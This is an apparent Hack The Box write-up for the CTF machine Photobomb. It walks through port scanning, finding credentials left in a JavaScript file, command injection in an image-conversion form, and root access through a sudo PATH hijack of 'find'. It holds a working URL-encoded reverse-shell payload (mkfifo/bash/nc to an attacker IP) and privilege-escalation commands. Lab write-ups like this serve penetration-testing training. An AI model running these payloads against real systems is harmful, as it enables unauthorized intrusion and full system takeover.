---
title: Hack the Box - Writeup (Photobomb)
description: This is a walkthrought for the Photobomb CTF on Hack The Box. It
  shows how easily we can exploit an Basic HTTP Authentication.
category: Writeup
author:
  name: Farouk Mokhtari
  email: fmokhtari@mail.ru
  website: https://fmokhtari.com
  btc: 1JJmuidSTRCugnBKH8H7bDxEmTtAAg4kyn
  usdt: TWi6yNRhxzkmgZhhoriDzWgvrSsxbdQCb8
  xmr: 87Asjp2TLCkKnw3PYsiKaTDwL8mNhiL7uV67ptCtVxqbSnaZfATQ6t4d1mfWnKu4kB4ieQHMApGhUdUY3h4RKBS2Kuc5RyW
tags:
  - hackthebox
  - ctfs
date: 2022-12-12T06:30:49.237Z
---
## Introduction

This machine is an easy machine that demonstrates how you can easily exploit a
basic HTTP Authentication.

## Enumeration

After the usual nmap scan we have the following results.

```shell
# Nmap 7.93 scan initiated Wed Dec  7 19:50:38 2022 as: nmap -sC -sV -v -oA 10.10.11.182-full.txt 10.10.11.182
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
| http-methods:
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  7 19:50:53 2022 -- 1 IP address (1 host up) scanned in 14.63 seconds
```

2 posts open :

- 22 (ssh)
- 80 (http) [photobomb.htb](http://photobomb.htb/)

As usual we add the domain to our **/etc/hosts** file. Since we know port 80 is
open, we do an enumeration for a list of directories.

```shell
gobuster dir -w wordlist.txt -u http://photobomb.htb/ -x php,txt,html
```

We find a url [http://photobomb.htb/printer](http://photobomb.htb/printer) that
takes us to a login session.

The login session is a Basic HTTP Authentication. After checking the page source
code we find something interesting in there. we find this file
[photobomb.js](http://photobomb.htb/photobomb.js)

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (
    document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)
  ) {
    document
      .getElementsByClassName("creds")[0]
      .setAttribute("href", "http://pH0t0:b0Mb!@photobomb.htb/printer");
  }
}
window.onload = init;
```

This javascript file contains the credentials to the session, as it says in the
commented line.

## Exploitation

This is an easy one to exploit since we can encode in the URL a reverse shell
that gives us the access to the machine.

```shell
 curl -X POST -u pH0t0:b0Mb! "http://photobomb.htb/printer" -d "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.78%201234%20%3E%2Ftmp%2Ff&dimensions=3000x2000"
```

You have a shell. So after getting the user flag it's easy to elevate your
priviledges.

```shell
 sudo -l
```

gives this result

```shell
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

## Priviledge Escalation

It means we can execute **/opt/cleanup.sh** with some environment variables as
root.

```shell
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

Create a file that contains the following.

```shell
 echo '/bin/bash -i'>find
 chmod +x find
```

Run this command now.

```shell
 sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

You're root, now you know the drill.

